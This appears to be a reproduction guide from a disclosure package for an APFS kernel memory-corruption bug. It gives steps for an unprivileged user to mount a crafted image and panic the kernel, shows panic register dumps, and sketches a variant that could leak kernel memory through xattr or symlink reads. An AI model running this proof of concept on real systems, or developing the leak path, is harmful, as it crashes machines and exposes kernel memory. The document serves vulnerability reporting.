# Reproduction

**Disposable VM or test machine only. The crafted image deliberately causes
kernel memory corruption.**

## Files

- `apfs_btree_compact_16k_CODEX2.img.gz`: primary crafted image
- `baseline_16k.img.gz`: unmodified control image
- `apfs_btree_compact_tool.py`: offline image inspector and crafter

## Crafted trigger

Run as a standard non-admin account:

```sh
gunzip apfs_btree_compact_16k_CODEX2.img.gz
hdiutil attach ./apfs_btree_compact_16k_CODEX2.img
touch /Volumes/CODEXBTREE/TRIGGER
```

Expected result on 26A5378n: kernel panic with APFS in the backtrace. Depending
on heap layout, GZAlloc may catch the direct destination write or a secondary
read after the controlled write has corrupted an adjacent APFS allocation.
The bundled primary panic is the direct-write variant.

## Negative control

```sh
gunzip baseline_16k.img.gz
hdiutil attach ./baseline_16k.img
touch /Volumes/CODEXBTREE/CONTROL
hdiutil detach <container-device-from-hdiutil>
```

Expected result: mount, file create, and detach all succeed.

## Offline inspection

```sh
python3 apfs_btree_compact_tool.py inspect \
  apfs_btree_compact_16k_CODEX2.img
```

The simulator prints the final controlled source and destination spans and
reports `WRITE-BELOW by 0x92c`.

## Disclosure-mode status

The same sink can be configured with a deep `val_off` and a small cumulative
length so the source is tens of kilobytes below the node while the destination
is inside it. Compaction then rewrites the TOC to the new in-node value. A
crafted xattr or symlink record can expose the bytes through `getxattr` or
`readlink`.

This package documents that return path in
`DISCLOSURE_AND_EXPLOITABILITY.md`, but does not yet include a dedicated
disclosure image or userspace readback transcript. Do not treat the commands
above as a disclosure reproduction; they exercise the dynamically confirmed
write variant.

## Independent second machine

The same `CODEX2` image was also run as uid 501 in an independently cloned
26A5378n VM. The baseline survived mount and `touch`; the crafted image
panicked with:

```text
ESR = 0x96000007
FAR = 0xfffffe31abd60000
x0  = 0xfffffe31abd46d3e
x19 = 0x1d29a
x22 = 0xfffffe31abd53fd8
x26 = 0xfffffe31abd50000
x22 - (x19 & 0xffff) = x0
```

That replay is a source-side read fault (`WnR=0`), not a write panic. It is an
independent reproduction and exact destination-formula confirmation. The
bundled `0x96000047` panic remains the write evidence. See
`SECOND_HOST_REPRODUCTION.txt`.
